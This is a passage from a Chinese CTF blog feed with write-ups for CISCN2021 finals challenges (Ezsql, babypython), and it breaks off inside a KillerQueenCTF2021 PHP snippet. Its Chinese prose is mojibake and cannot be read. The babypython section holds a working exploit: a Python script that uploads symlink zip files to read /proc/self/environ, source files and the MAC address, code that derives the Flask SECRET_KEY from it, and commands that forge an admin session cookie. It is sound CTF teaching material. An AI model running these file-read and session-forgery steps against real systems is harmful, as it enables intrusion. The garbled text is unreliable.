&lt;p>‰∏ãÈù¢ÁöÑwp‰ºöÂÖàËØ¥Á∫Ø‰øÆÂ§çËßíÂ∫¶ÔºåÂÜç‰∏≤‰∏Ä‰∏ãÊï¥‰ΩìÁöÑÁü•ËØÜÁÇπÔºõÂõ†‰∏∫Ëá™Â∑±Ê∞¥Âπ≥ÊúâÈôêÔºåÊÉ≥Â∞ΩÂèØËÉΩËØ¥ÁöÑÊ∏ÖÊ•ö‰∏Ä‰∫õÂ∞±‰ºöÊØîËæÉÂï∞Âó¶ÔºåËßÅË∞ÖQAQ&lt;/p>
&lt;h2 id="ezsql">Ezsql&lt;/h2>
&lt;h3 id="fix">FIX&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107083450780.png" alt="image-20211107083450780">&lt;/p>
&lt;p>200Ë°åÔºåÂ§™ÂÖ∏‰∫ÜÔºåÂØπ‰º†ÂÖ•ÁöÑÂèÇÊï∞ÂÆåÂÖ®Ê≤°ÊúâÊ£ÄÊµãÔºåÊòØ‰∏™Á≠õÂ≠êÔºõÁî®È¢ÑÂ§ÑÁêÜÁöÑÊñπÂºè‰øÆÔºåÂèàÂèØ‰ª•ÂàÜ‰∏∫‰∏§ÁßçÂΩ¢Âºè&lt;/p>
&lt;h3 id="mysqlÈ¢ÑÂ§ÑÁêÜ">mysqlÈ¢ÑÂ§ÑÁêÜ&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107083655664.png" alt="image-20211107083655664">&lt;/p>
&lt;p>ÂÖ∂‰∏≠201Ë°åÁöÑ&lt;code>ss&lt;/code>ÊåáÁöÑÊòØÁªëÂÆöSQLÂèÇÊï∞ÁöÑÁ±ªÂûã‰∏∫stringÔºåËøô‰∏ÄÈ°πÂøÖ‰∏çÂèØÂ∞ëËÄå‰∏îÂøÖÈ°ª‰∏éÂêéÈù¢ÁöÑÂèÇÊï∞‰∏Ä‰∏ÄÂØπÂ∫î&lt;/p>
&lt;h3 id="pdoÈ¢ÑÂ§ÑÁêÜ">PDOÈ¢ÑÂ§ÑÁêÜ&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107084309239.png" alt="image-20211107084309239">&lt;/p>
&lt;p>PDOÈ¢ÑÂ§ÑÁêÜÂ±û‰∫éÊòØÈÄöÈò≤‰∫ÜÔºåËÉΩÊúâÊïàÂú∞Â∫îÂØπsqliÁâπÂà´ÊòØÂ†ÜÂè†Ê≥®ÂÖ•Ôºå208Ë°åÁöÑËÆæÁΩÆÈ°πÊÑè‰∏∫Á¶ÅÁî®Ê®°ÊãüÈ¢ÑÂ§ÑÁêÜ&lt;/p>
&lt;h2 id="ciscn2021-ÊÄªÂÜ≥Ëµõbabypython">[CISCN2021 ÊÄªÂÜ≥Ëµõ]babypython&lt;/h2>
&lt;h3 id="fix-1">FIX&lt;/h3>
&lt;p>sshËøû‰∏äÂêéÁúã‰∏ãÁõÆÂΩïÁªìÊûÑ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212456961.png" alt="image-20211106212456961">&lt;/p>
&lt;p>Êü•Áúã/app/y0u_found_it/y0u_found_it_main.py&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212556547.png" alt="image-20211106212556547">&lt;/p>
&lt;p>11Ë°åËøô‰∏çÊòØÂÖ∏‰∏≠ÂÖ∏‰∫ÜÔºüËØªmacÂú∞ÂùÄÂ∞±ÊâìÈÄö‰∫ÜÔºåÊâÄ‰ª•Êàë‰ª¨Áõ¥Êé•ÊääSECRET_KEYÊîπ‰∏∫‰∏Ä‰∏™ÂèàÈïøÂèà‰π±ÁöÑÈöèÊú∫Â≠óÁ¨¶‰∏≤Âç≥ÂèØÔºåÂèØ‰ª•‰ΩøÁî®&lt;a href="uuid/guid%E7%94%9F%E6%88%90%E5%99%A8">uuid/guidÁîüÊàêÂô®&lt;/a>Êù•ÁîüÊàê&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106210732859.png" alt="image-20211106210732859">&lt;/p>
&lt;blockquote>
&lt;p>‚Äî‚Äî‚Äî‚ÄîÁ¢éÁ¢éÂøµÔºöËøôÈáå‰øÆÂ§çÁöÑÊó∂ÂÄôÂèØËÉΩÁúãËÑ∏ÔºüÊàëÂú®Âá†Â§©ÂâçËØïÁöÑÊó∂ÂÄôÁî®ÁöÑ‰∏ÄÊ®°‰∏ÄÊ†∑ÁöÑÊñπÊ≥ïÔºå‰ΩÜÊòØÊÄé‰πàÈÉΩ‰∏çËÉΩËøácheckÔºå‰ªäÂ§©ËØï‰∫Ü‰∏ÄÊ¨°Â∞±ÂèØ‰ª•‰∫ÜÔºå‰ΩÜÊòØÂú®ÂÜôwpÁöÑÊó∂ÂÄôÂÜçÂ§çÁõòÂ∞±Âèà‰∏çÂèØ‰ª•‰∫Ü‚Ä¶‚Ä¶emmm ÂèØËÉΩËøòÊòØÂì™ÈáåÁöÑÁªÜËäÇÂá∫‰∫ÜÈîô‰ΩÜÊòØÊàëÊ≤°ÊúâÊ≥®ÊÑèÂà∞ÔºüÁªôÊàëÊï¥‰∏ç‰ºö‰∫ÜÂ±û‰∫éÊòØ&lt;/p>
&lt;/blockquote>
&lt;h3 id="ÂÖ≥‰∫éÊú¨È¢ò">ÂÖ≥‰∫éÊú¨È¢ò&lt;/h3>
&lt;p>ÊòØ‰∏™ÂéüÈ¢òÔºåËøòÊòØ‰∏™Êúâ‰∫ÜÂåÖÊµÜÁöÑÂéüÈ¢òÔºåÂèÇËßÅ-&amp;gt;&lt;strong>&lt;a href="https://buuoj.cn/challenges#%5BHCTF%202018%5DHideandseek">[HCTF 2018]Hideandseek&lt;/a>&lt;/strong> | &lt;strong>&lt;a href="https://buuoj.cn/challenges#%5BSWPU2019%5DWeb3">[SWPU2019]Web3&lt;/a>&lt;/strong>ÔºåÂÅöËøáÁöÑÂ∞±Áü•ÈÅìËøô‰ªñÂ¶àÁúüÁöÑÂ∞±‰∏ÄÊ®°‰∏ÄÊ†∑hhhhhhhh&lt;/p>
&lt;p>ËÄÉÁÇπÂú®‰∫élinuxËΩØÈìæÊé•+uuid+flask-session‰º™ÈÄ†ÔºåÂêéËÄÖËøòÁªèÂ∏∏ÂçïÁã¨Âá∫È¢òÔºåÊØîÂ¶Ç &lt;strong>&lt;a href="https://buuoj.cn/challenges#%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb4">[CISCN2019 Âçé‰∏úÂçóËµõÂå∫]Web4&lt;/a>&lt;/strong>ÔºåÈÉΩÂø´ÁÉ§ÁÉÇ‰∫Ü&lt;/p>
&lt;h3 id="ËÄÉÁÇπ‰∏Ä--uuidsecret_key">ËÄÉÁÇπ‰∏Ä ¬∑ uuid&amp;amp;SECRET_KEY&lt;/h3>
&lt;p>SECRET_KEYÈÄöËøáuuid+‰º™ÈöèÊú∫Êï∞ÁöÑÊñπÂºèÁîüÊàêÔºåËøô‰∏™ËÄÉÁÇπÂèØ‰ª•ÂèÇËÄÉ &lt;strong>&lt;a href="https://buuoj.cn/challenges#%5BCISCN2019%20%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA%5DWeb4">[CISCN2019 Âçé‰∏úÂçóËµõÂå∫]Web4&lt;/a>&lt;/strong>ÔºåÂÖ∂‰∏≠app.pyÊòØËøôÊ†∑ÂÜôÁöÑ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212834438.png" alt="image-20211106212834438">&lt;/p>
&lt;p>&lt;code>uuid.getnode()&lt;/code>‰ºö‰ª•48‰Ωç‰∫åËøõÂà∂ÈïøÂ∫¶ÁöÑÊ≠£Êï¥Êï∞ÂΩ¢ÂºèËøîÂõûmacÂú∞ÂùÄÔºålinux‰∏ãmacÂú∞ÂùÄÁöÑ‰ΩçÁΩÆÂú®&lt;code>/sys/class/net/eth0/address&lt;/code>ÔºåËØªÂá∫macÂú∞ÂùÄÂêéÊàë‰ª¨‰πüÊù•ÁîüÊàê‰∏ÄÊ≥¢‰º™ÈöèÊú∫Êï∞&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210707204313712.png" alt="image-20210707204313712">&lt;/p>
&lt;p>‰πãÂêéÈÄöËøáflask-session-cookie-manager‰∏ÄÊääÊ¢≠Âç≥ÂèØ‰º™ÈÄ†sessionÂÄº&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210707204240633.png" alt="image-20210707204240633">&lt;/p>
&lt;p>‚Äî‚Äî‚Äî‚ÄîÂè¶Â§ñÔºåÈÄöÂ∏∏ËÆøÈóÆ‰∏çÂ≠òÂú®ÁõÆÂΩïÊó∂SECRET_KEY‰ºöÂá∫Áé∞Âú®ËØ∑Ê±ÇÂ§¥‰∏≠&lt;/p>
&lt;h3 id="ËÄÉÁÇπ‰∫å--linuxËΩØÈìæÊé•Êñá‰ª∂ËØªÂèñzipÂéãÁº©ÂåÖ">ËÄÉÁÇπ‰∫å ¬∑ linuxËΩØÈìæÊé•Êñá‰ª∂ËØªÂèñ&amp;amp;zipÂéãÁº©ÂåÖ&lt;/h3>
&lt;p>ln -sÊòØlinux‰∏≠ÁöÑËΩØÈìæÊé•ÂëΩ‰ª§ÔºåÊàë‰ª¨ÂèØ‰ª•Âà∂‰ΩúÂØπÂ∫îÊñá‰ª∂ÁöÑÁªùÂØπË∑ØÂæÑÁöÑËΩØÈìæÊé•Êù•ËØªÊñá‰ª∂ÔºõÂΩì‰∏çÁü•ÈÅìflaskÂ∑•‰ΩúÁõÆÂΩïÂèØ‰ª•‰ΩøÁî®&lt;code>/proc/self/cwd&lt;/code>Êù•ÊåáÂêëÂΩìÂâçËøõÁ®ãÁöÑÁõÆÂΩï&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ln -s /proc/self/cwd/flag/flag/.jpg qwe
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÊàñËÄÖÈÄöËøá&lt;code>/proc/self/environ&lt;/code>Êñá‰ª∂ÈáåÂåÖÂê´ËøõÁ®ãÁöÑÁéØÂ¢ÉÂèòÈáèÔºåÂèØ‰ª•‰ªé‰∏≠Ëé∑ÂèñflaskÁöÑÁªùÂØπË∑ØÂæÑÔºåÂÜçÂà∂‰ΩúËΩØÈìæÊé•ÔºàÂÖ≥‰∫é/procÁöÑÊõ¥Â§ö‰ø°ÊÅØÂèØ‰ª•ÂèÇËßÅ-&amp;gt;&lt;a href="https://amiaaaz.github.io/proc%E7%9B%AE%E5%BD%95%E7%9A%84%E5%A6%99%E7%94%A8">/procÁõÆÂΩïÁöÑÂ¶ôÁî®&lt;/a> | &lt;a href="https://bbs.zkaq.cn/t/3639.html">LFItoRCEÂà©Áî®ÊÄªÁªì&lt;/a>ÔºåÈ¢ò-&amp;gt;&lt;a href="https://buuoj.cn/challenges#%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E7%99%BD%E8%99%8E%E7%BB%84%5DPicDown">[ÁΩëÈºéÊùØ 2020 ÁôΩËôéÁªÑ]PicDown&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">ln -s /proc/self/environ qwe
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ËÄåÂØπ‰∫éÁõÆÂΩïÂÜÖÊñá‰ª∂ÁöÑÂàó‰∏æ‰πüÊòØÊúâÊñπÊ≥ïÁöÑÔºåÂèÇËßÅ-&amp;gt;&lt;a href="https://blog.csdn.net/keyball123/article/details/105169946">34C3 CTF WebÈ¢ò extract0r Writeup&lt;/a>&lt;/p>
&lt;p>ÁîöËá≥‰πüÂèØ‰ª•ÂÜôÂÖ•shellÔºåÂèÇËßÅ-&amp;gt;&lt;a href="https://mp.weixin.qq.com/s/NvItuko9ZAUNTJaSzBpNKw">[Ê∑±ËÇ≤ÊùØ 2021]Zipzip&lt;/a>&lt;/p>
&lt;p>Âà∂‰ΩúÂ•ΩÁöÑËΩØÈìæÊé•ÈÄöËøázipÊâìÂåÖ&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">zip -ry qwe.zip qwe
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Êõ¥Â§öÈ¢òÁõÆ‰∏≠ÁöÑÂ∫îÁî®ÂèØ‰ª•ÂèÇËßÅ-&amp;gt;&lt;a href="http://redteam.today/2018/01/20/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E9%A2%98%E7%9A%84%E5%A4%9A%E7%A7%8D%E8%A7%A3%E6%B3%95/">ËÆ∞ÂΩï‰∏ÄÈÅìÈ¢òÁöÑÂ§öÁßçËß£Ê≥ï&lt;/a>&lt;/p>
&lt;p>ÂÖ≥‰∫éËøô‰∏™ÊºèÊ¥ûÁöÑÂÆûÈôÖÂ∫îÁî®ÂèØ‰ª•ÂèÇËßÅ-&amp;gt;&lt;a href="https://paper.seebug.org/104/">GitLab ‰ªªÊÑèÊñá‰ª∂ËØªÂèñÊºèÊ¥û (CVE-2016-9086) Âíå‰ªªÊÑèÁî®Êà∑ token Ê≥ÑÈú≤ÊºèÊ¥û&lt;/a>&lt;/p>
&lt;h3 id="attack">*ATTACK&lt;/h3>
&lt;p>exp.py - 1 ÁîüÊàêËΩØÈìæÊé•&amp;amp;zip&amp;amp;Ëá™Âä®‰∏ä‰º†&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
&lt;span style="color:#111">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://0a716e50-1cf2-4cd8-a00f-b70d9987ed64.node3.buuoj.cn/upload&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">makezip&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;ln -s &amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#39; exp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># os.system(&amp;#39;zip --symlinks exp.zip exp&amp;#39;)&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;zip -ry exp.zip exp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">makezip&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">files&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#39;the_file&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;./exp.zip&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;rb&amp;#39;&lt;/span>&lt;span style="color:#111">)}&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">exploit&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">files&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">files&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">res&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">exploit&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;rm -rf exp&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">os&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;rm -rf exp.zip&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python3 exp.py /proc/self/environ
python3 exp.py /app/y0u_found_it.ini
python3 exp.py /app/y0u_found_it/y0u_found_it_main.py
python3 exp.py /sys/class/net/eth0/address
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106234837193.png" alt="image-20211106234837193">&lt;/p>
&lt;p>exp.py - 2 Ê†πÊçÆmacÂú∞ÂùÄÁîüÊàê‰º™ÈöèÊú∫Êï∞&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">uuid&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">random&lt;/span>
&lt;span style="color:#111">mac&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;02:42:0a:00:cb:06&amp;#34;&lt;/span>
&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">mac&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">split&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;:&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">bin&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;0b&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">zfill&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;span style="color:#111">temp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">mac&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">temp&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">seed&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">mac&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">random&lt;/span>&lt;span style="color:#111">()&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">100&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># 36.014406163923596&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">python3 flask_session_cookie_manager3.py decode -c &lt;span style="color:#d88200">&amp;#39;eyJ1c2VybmFtZSI6Imd1ZXN0In0.FGg0EA.rHjESo_p6RCP0eiosSFmF3xEmRc&amp;#39;&lt;/span>
python3 flask_session_cookie_manager3.py encode -s &lt;span style="color:#d88200">&amp;#39;36.014406163923596&amp;#39;&lt;/span> -t &lt;span style="color:#d88200">&amp;#34;{u&amp;#39;username&amp;#39;: u&amp;#39;admin&amp;#39;}&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106235751916.png" alt="image-20211106235751916">&lt;/p>
&lt;p>ÁøªÂõûÂ§¥ÁúãÊ∫êÁ†ÅÔºåÂ•ΩÂÆ∂‰ºôËøôÈáåÊúâÂÜÖÈ¨º&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106235832895.png" alt="image-20211106235832895">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107075450043.png" alt="image-20211107075450043">&lt;/p>
&lt;p>ËøîÂõûÁöÑÂπ∂‰∏çÊòØÁúüÊ≠£ÁöÑflagÔºåËÄåÊòØsecret.secret‰∏≠ÁöÑÂÜÖÂÆπno flah&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211107075326929.png" alt="image-20211107075326929">&lt;/p>
&lt;p>67Ë°åËøôÈáå‰ºöÂØπunzipÊâìÂºÄÁöÑÊñá‰ª∂ËøõË°åÊ£ÄÊü•ÔºåÂè™Ë¶ÅÂê´ÊúâflagÂ≠óÊ†∑Â∞±‰ºöÈáçÂÆöÂêëËá≥/?error=1&lt;/p>
&lt;p>‚Äî‚Äî‚Äî‚ÄîËøôÈáåÊàëÊÑüËßâÂéüÈ¢òÂ∫îËØ•secret.py‰∏≠ÁöÑ&lt;code>secret=&lt;/code>Áõ¥Êé•Â∞±ËÉΩËØªÂá∫Êù•flagÔºåÊÉ≥‰∫ÜÂ•Ω‰πÖÔºåÂÜçÁªï‰∏ÄÂ±Çflag.txtÁöÑËØùÊàëÊòØÊÉ≥‰∏çÂá∫Êù•‰ªÄ‰πàbypassÁöÑÊñπÊ≥ï‰∫ÜÔºåÊàëÂÄæÂêë‰∫éÊòØÂ∏ÉÁΩÆÁéØÂ¢ÉÁöÑÊó∂ÂÄôÊ≤°ÊúâËÆæÁΩÆËøô‰∏ÄÁÇπÔºà&lt;/p>
&lt;h2 id="ciscn2021-ÊÄªÂÜ≥Ëµõeasy_python">***[CISCN2021 ÊÄªÂÜ≥Ëµõ]easy_python&lt;/h2>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211106212057524.png" alt="image-20211106212057524">&lt;/p>
&lt;p>‰∏çÁü•ÈÅìÊòØÊàëÁöÑÁΩëÁªúÈóÆÈ¢òËøòÊòØ‰ªÄ‰πàÊú™Áü•ÁöÑbug‚Ä¶‚Ä¶check‰πãÂêéÂ∞±‰ºöÂÆïÊú∫ÔºåÂè™ËÉΩÈáçÊñ∞‰∏ãÂèëÈù∂Êú∫&lt;/p>
&lt;h2 id="ciscn2021-ÊÄªÂÜ≥Ëµõezj4va">***[CISCN2021 ÊÄªÂÜ≥Ëµõ]ezj4va&lt;/h2>
&lt;p>&lt;a href="https://juejin.cn/post/6997314123918737422">https://juejin.cn/post/6997314123918737422&lt;/a>&lt;/p>
&lt;p>Ëøò‰∏ç‰ºöjava ÂÖàÁ©∫ÁùÄTAT&lt;/p></description></item><item><title>KillerQueenCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/10/30/killerqueenctf2021-wp/</link><pubDate>Sat, 30 Oct 2021 16:39:15 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/30/killerqueenctf2021-wp/</guid><description>&lt;h2 id="webjust-not-my-type">web/Just Not My Type&lt;/h2>
&lt;blockquote>
&lt;p>I really don&amp;rsquo;t think we&amp;rsquo;re compatible (&lt;a href="http://143.198.184.186:7000/">Link&lt;/a>)&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#111">$FLAG&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;shhhh you don&amp;#39;t get to see this locally&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SERVER&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;REQUEST_METHOD&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$password&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_POST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">strcasecmp&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$password&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$FLAG&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$FLAG&lt;/span>&lt;span style="color:#111">;&lt;/span>
